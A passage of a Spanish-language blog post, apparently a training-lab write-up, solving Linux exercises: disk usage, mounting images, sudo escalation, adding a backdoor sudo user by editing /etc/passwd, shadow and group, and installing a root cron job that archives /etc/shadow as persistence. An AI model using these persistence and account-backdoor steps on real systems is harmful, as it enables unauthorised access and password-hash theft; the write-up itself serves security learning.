+<span class="nt">-rwxr-xr-x</span> 1 root root 739123 Feb 16 10:45 IMG_3794.jpg
+<span class="nt">-rwxr-xr-x</span> 1 root root 426757 Feb 16 10:45 IMG_5042.jpg
+</code></pre></div></div>
+
+<p>Finalmente, para quitar el USB de forma segura utilizamos el comando ‘umount’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:/mnt/usb<span class="nv">$ </span><span class="nb">sudo </span>umount /mnt/usb 
+umount: /mnt/usb: target is busy.
+
+kali@kali:/mnt/usb<span class="nv">$ </span><span class="nb">cd</span> ~
+
+kali@kali:~<span class="nv">$ </span><span class="nb">sudo </span>umount /mnt/usb
+
+kali@kali:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Exercises</strong></p>
+
+<p><strong>¿Cuál es el tipo de sistema de ficheros de root (/) en la máquina objetivo?</strong></p>
+
+<p>Utilizamos la utilidad ‘df -T’ para desplegar el sistema de ficheros y también ver su tipo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:/etc/apache2# <span class="nb">df</span> <span class="nt">-T</span>
+Filesystem                        Type     1K-blocks    Used Available Use% Mounted on
+udev                              devtmpfs    974060       0    974060   0% /dev
+tmpfs                             tmpfs       203544    1112    202432   1% /run
+/dev/mapper/ubuntu--vg-ubuntu--lv ext4      20511312 4844328  14602024  25% /
+...
+</code></pre></div></div>
+
+<p>De esta forma, el tipo de sistema de ficheros asociados a / es ext4.</p>
+
+<p><br /></p>
+
+<p><strong>¿Qué directorio base (es decir, qué directorio directamente debajo de /) está utilizando la mayor parte del espacio?</strong></p>
+
+<p>Empleamos el comando ‘du -sh’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:/# <span class="nb">du</span> <span class="nt">-sh</span> /<span class="k">*</span>
+0	/bin
+101M	/boo
+4.0K	/cdrom
+0	/dev
+5.9M	/etc
+148K	/home
+0	/lib
+0	/lib32
+0	/lib64
+0	/libx32
+16K	/lost+found
+4.0K	/media
+4.0K	/mn
+4.0K	/op
+<span class="nb">du</span>: cannot access <span class="s1">'/proc/7079/task/7079/fd/4'</span>: No such file or directory
+<span class="nb">du</span>: cannot access <span class="s1">'/proc/7079/task/7079/fdinfo/4'</span>: No such file or directory
+<span class="nb">du</span>: cannot access <span class="s1">'/proc/7079/fd/3'</span>: No such file or directory
+<span class="nb">du</span>: cannot access <span class="s1">'/proc/7079/fdinfo/3'</span>: No such file or directory
+0	/proc
+244K	/roo
+1.1M	/run
+0	/sbin
+1.1G	/snap
+4.0K	/srv
+2.1G	/swap.img &lt;- Observemos que este no es la respuesta porque no es un directorio.
+0	/sys
+68K	/tmp
+1.8G	/usr
+838M	/var
+</code></pre></div></div>
+
+<p>Para obtener el espacio ocupado en disco de todos los directorios debajo de /.</p>
+
+<p><br /></p>
+
+<p><strong>3. En la máquina de destino, monte <em>flag.img</em> ubicado en /root y luego lea flag.txt para obtener la bandera.</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux04:/# <span class="nb">mkdir</span> /tmp/flag
+root@linux04:/# mount /root/flag.img /tmp/flag
+root@linux04:/# <span class="nb">cd</span> /tmp/flag
+root@linux04:/tmp/flag# <span class="nb">ls
+</span>flag.txt  lost+found
+root@linux04:/tmp/flag# <span class="nb">cat </span>flag.txt 
+OS<span class="o">{</span>mounting_the_flag!!<span class="o">}</span>
+</code></pre></div></div>
+
+<h3 id="11-linux-challenge">11. Linux Challenge.</h3>
+
+<p><strong>1. Connect to the target machine with the credentials “brandon:moneytree”. Analyze the .doc, .txt. and .csv files on the machine to research if you can find any useful information about the machine. What is the flag in Brandon’s home directory?</strong></p>
+
+<p>Accedemos a la máquina y encontramos la flag en el home de brandon.</p>
+
+<p><br /></p>
+
+<p><strong>2. Find Katy’s credentials and log in as this user. What is the flag in Katy’s home directory?</strong></p>
+
+<p>Realizando un trabajo de enumeración encontramos un fichero en ‘/’ llamado ‘katy-stuff.csv’ en el encontramos las credenciales ‘katy:jurisdiction’. Además, inspeccionando los grupos a los que este usuario pertenece encontramos que pertenece al grupo sudo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katy@linux05:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>katy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>katy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>katy<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Para cerciorarnos, ejecutamos ‘sudo -l’ con la finalidad de ver hasta que punto se extiende el uso del comando ‘sudo’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katy@linux05:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>katy: 
+Sorry, try again.
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>katy: 
+Matching Defaults entries <span class="k">for </span>katy on linux05:
+   env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User katy may run the following commands on linux05:
+   <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</code></pre></div></div>
+
+<p>Con lo que podemos correr todos los comandos en el sistema. Así, ejecutamos ‘sudo -i’ e introducimos la contraseña de ‘katy’ escalando verticalmente privilegios hacia el super usuario.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katy@linux05:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-i</span>
+root@linux05:~#
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>3. Utilice el nivel de acceso de katy para agregar un usuario a la máquina con las credenciales “jesse:thisismine”. Dale al nuevo usuario los mismos permisos que le pertenecen a katy. Luego ejecute el binario ’newuser_check’ en /home de katy para obtener la flag.</strong></p>
+
+<p>Como hemos escalado privilegios y somos root, poseemos la facultad de añadir un nuevo usuario ya que podemos manipular los ficheros /etc/passwd, /etc/shadow 7 /etc/group.</p>
+
+<p>Para añadir el usuario copiamos una linea del fichero /etc/passwd:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katy:x:1001:1001::/home/katy:/bin/bash
+</code></pre></div></div>
+
+<p>y cambiamos el nombre, el directorio home y el UID y GID:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jesse:x:1002:1001::/home/jesse:/bin/bash
+</code></pre></div></div>
+
+<p>Observemos que hemos añadido a jesse en el grupo katy pues deben compartir permisos.</p>
+
+<p>Como sabemos, el campo que contiene una ‘x’ indica que la contraseña está hasheada en el archivo /etc/shadow. Así, utilizamos el comando ‘mkpasswd’ para añadir el hash de la contraseña ‘thisismine’.</p>
+
+<p>En primer lugar, obtenemos una línea del fichero /etc/shadow:</p>
+
+<pre><code class="language-defaul">katy:$6$5rcvylav3TuHVuLS$nQh1dymT6wlkb0HjEHFdSsKdBhf1cVhGie9Rmmi7.Tw2KjFo.4HvxgNWyuAaFY7nH4k7.3/zXlxRU/8Ix6edl1:18843:0:99999:7:::
+</code></pre>
+
+<p>Sabemos que esta línea está dividida en campos de entre los nos interesan los dos primeros que es nombre de usuario y el hash de la contraseña respectivamente. A su vez, el hash de la contraseña tiene la forma ‘$id$salt$hash’.</p>
+
+<ul>
+  <li>
+    <p>El ‘id’ es un número que designa el formato de hash que hemos designado, en este caso el 6 designa el SHA-512.</p>
+  </li>
+  <li>
+    <p>El ‘salt’ es un relleno para volver más complejo el hash de forma que este sea menos identificable.</p>
+  </li>
+  <li>
+    <p>El ‘hash’ es el hash de la propia contraseña en el formato descrito por el ‘id’.</p>
+  </li>
+</ul>
+
+<p>De esta forma, el hash de la contraseña es:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkpasswd <span class="nt">--method</span><span class="o">=</span>SHA-512 thisismine
+<span class="nv">$6$6qhs4kvUJ6r3F0</span>.k<span class="nv">$FQTiyFU9xQjjd2FHS</span>.UXzrxHVO6rdAf03S46ekW4DhdI8bVaN90EuyR5nAXrvFmf1dGz8zaQxfaeAYqRoCU7X1
+</code></pre></div></div>
+
+<p>la línea que debemos añadir es:</p>
+
+<pre><code class="language-defaul">jesse:$6$6qhs4kvUJ6r3F0.k$FQTiyFU9xQjjd2FHS.UXzrxHVO6rdAf03S46ekW4DhdI8bVaN90EuyR5nAXrvFmf1dGz8zaQxfaeAYqRoCU7X1:18843:0:99999:7:::
+</code></pre>
+
+<p>Para comprobar que hemos añadido correctamente el usuario volvemos a nuestra sesión con katy e intentamos acceder a la cuenta de jesse con ‘su’ y las credenciales construidas anteriormente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katy@linux05:~<span class="nv">$ </span>su jesse
+Password: 
+jesse@linux05:/home/katy<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>jesse<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>katy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>katy<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Observamos que ha funcionado, ahora lo que queda es incluir al nuevo usuario en el grupo ‘27 (sudo)’. Para ello bastará con modificar como root el fichero /etc/group y añadimos a jesse junton con katy separado por comas tal y como se puede ver a continuación:</p>
+
+<pre><code class="language-defaul">root@linux05:~# vi /etc/group
+...
+floppy:x:25:
+tape:x:26:
+sudo:x:27:katy,jesse
+audio:x:29:
+dip:x:30:
+...
+</code></pre>
+
+<p>Para realizar la última comprobación nos logeamos como Jesse y:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katy@linux05:~<span class="nv">$ </span>su jesse
+Password: 
+To run a <span class="nb">command </span>as administrator <span class="o">(</span>user <span class="s2">"root"</span><span class="o">)</span>, use <span class="s2">"sudo &lt;command&gt;"</span><span class="nb">.</span>
+See <span class="s2">"man sudo_root"</span> <span class="k">for </span>details.
+
+jesse@linux05:/home/katy<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>jesse<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>katy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>katy<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>
+jesse@linux05:/home/katy<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>jesse: 
+Matching Defaults entries <span class="k">for </span>jesse on linux05:
+   env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User jesse may run the following commands on linux05:
+   <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+jesse@linux05:/home/katy<span class="nv">$ </span><span class="nb">exit</span>
+</code></pre></div></div>
+
+<p>Observamos que estamos en el grupo ‘sudo’ y que al ejecutar ‘sudo -l’ no hay límites en los comandos que podemos ejecutar como root.</p>
+
+<p><br /></p>
+
+<p><strong>4. Hay una unidad USB conectada a esta máquina que no se ha montado. Monte la unidad y busque su contenido para encontrar la siguiente bandera.</strong></p>
+
+<p>Al tratarse de un dispositivo externo, buscamos en /dev un archivo que sea del tipo ‘filesystem’ con el siguiente comando:</p>
+
+<pre><code class="language-defaul">root@linux05:/# for i in $(ls /dev -R); do file /dev/$i;done | grep filesystem
+/dev/usb: Linux rev 1.0 ext2 filesystem data, UUID=7352c0a1-f2b4-4ded-97be-9b03ca1cfcce (extents) (64bit) (large files) (huge files)
+</code></pre>
+
+<p>Observamos que el único archivo que parece ser un sistema de ficheros es uno denominado ‘/dev/usb’. Ese es nuestro usb y lo montamos creando un punto de montaje en /mnt como directorio ‘usb’ y con la utiliadad ‘mount’ montamos la imagen a través del siguiente comando:</p>
+
+<pre><code class="language-defaul">root@linux05:/# mkdir /mnt/usb; mount /dev/usb /mnt/usb; ls /mnt/usb
+bad-flag.csv  flag.txt  lost+found  wrong-flag.doc
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>5. ¿Cuántos archivos .doc y .csv en total hay en la máquina de destino (incluida la unidad adicional)?</strong></p>
+
+<p>Aplicamos el siguiente comando:</p>
+
+<pre><code class="language-defaul">root@linux05:/# (find / -name '*.doc' 2&gt;/dev/null &amp;&amp; find / -name '*.csv' 2&gt;/dev/null) | wc -l
+15
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>6. ¿Cuál es la bandera en el directorio de inicio de la raíz?</strong></p>
+
+<p>Lo buscamos con el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /root <span class="nt">-name</span> <span class="s1">'*flag*'</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>7. Copie el archivo backup.sh proporcionado en la máquina de destino y ejecútelo. Este script nos ayudará a crear una puerta trasera más persistente para el sistema. Otorgue permisos ejecutables a este script y luego ejecútelo para crear la copia de <em>seguridad</em> del archivo. Copie la copia de seguridad del archivo resultante en /usr/bin/backup en la máquina de destino. Asegúrese de que el archivo sea propiedad de root y luego programe un crontab en todo el sistema que ejecute este script a las 2 a. m. todos los días. Finalmente, ejecute el binario backup_check ubicado en el directorio de inicio de la raíz para obtener el indicador.</strong></p>
+
+<p>En primer lugar, abrimos en nuestra máquina local un servidor http con pyhton en el directorio en el que tenemos el fichero ‘backup.sh’.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server                                                                                      
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<p>Y lo descargamos desde la máquina víctima con ‘curl’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl &lt;IP&gt;:8000/backup.sh
+</code></pre></div></div>
+
+<p>Y examinamos el script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/bash</span>
+
+<span class="nb">echo</span> <span class="s2">"#include &lt;stdlib.h&gt;"</span> <span class="o">&gt;</span> backup.c
+<span class="nb">echo</span> <span class="s2">"int main(int argc, char *argv[]) {"</span> <span class="o">&gt;&gt;</span> backup.c
+<span class="nb">echo</span> <span class="s1">'system("tar -czvf /var/backups/backup.tar.gz /etc/shadow");'</span> <span class="o">&gt;&gt;</span> backup.c
+<span class="nb">echo</span> <span class="s2">"return 0;"</span> <span class="o">&gt;&gt;</span> backup.c
+<span class="nb">echo</span> <span class="s2">"}"</span> <span class="o">&gt;&gt;</span> backup.c
+gcc backup.c <span class="nt">-o</span> backup
+</code></pre></div></div>
+
+<p>Observamos que se trata de un código que genera un código en C y lo compila:</p>
+
+<pre><code class="language-C">#include &lt;stdlib.h&gt;
+int main(int argc, char *argv[]) {
+system("tar -czvf /var/backups/backup.tar.gz /etc/shadow
+return 0
+}
+</code></pre>
+
+<p>Este código a su vez recopila en un archivo comprimido ‘tar’ los contenidos de /etc/shadow. La idea por tanto parece clara, se trata ed un código que genera un ejecutable que guarda los hashes de contraseñas de los usuarios del sistema. Si este programa se ejecutase periódicamente en la máquina tendríamos una copia de seguridad de los hashes de contraseña del sistema que nos garantizaría una persistencia en el mismo.</p>
+
+<p>Así, ejecutamos el script y llevamos el ejecutable a ‘/usr/bin’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x backup.sh<span class="p">;</span> ./backup.sh<span class="p">;</span> <span class="nb">mv </span>backup /usr/bin/backup
+</code></pre></div></div>
+
+<p>Ahora, programos la ejecución periódica de este binario a través de /etc/crontab:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0  2    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    /usr/bin/backup
+</code></pre></div></div>
+
+<p>Esta línea ejecutará el /usr/bin/backup todos los dias a la hora 2 minuto 0, es decir, todos los días a las 2:00.</p>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#pen">pen</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=Linux&url=http%3A%2F%2Flocalhost%3A4000%2F2023-11-01-1.Linux%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2023-11-01-1.Linux%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2023-11-01-1.Linux%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-12-01-Easy/" data-toggle="tooltip" data-placement="top" title="Easy">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2023-11-02-2.PracticalTools/" data-toggle="tooltip" data-placement="top" title="Practical Tools">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/Qv1nTv5" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/Qvintvs1" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Qv1nTv5
+        &nbsp;&bull;&nbsp;
+      
+      2024
+
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
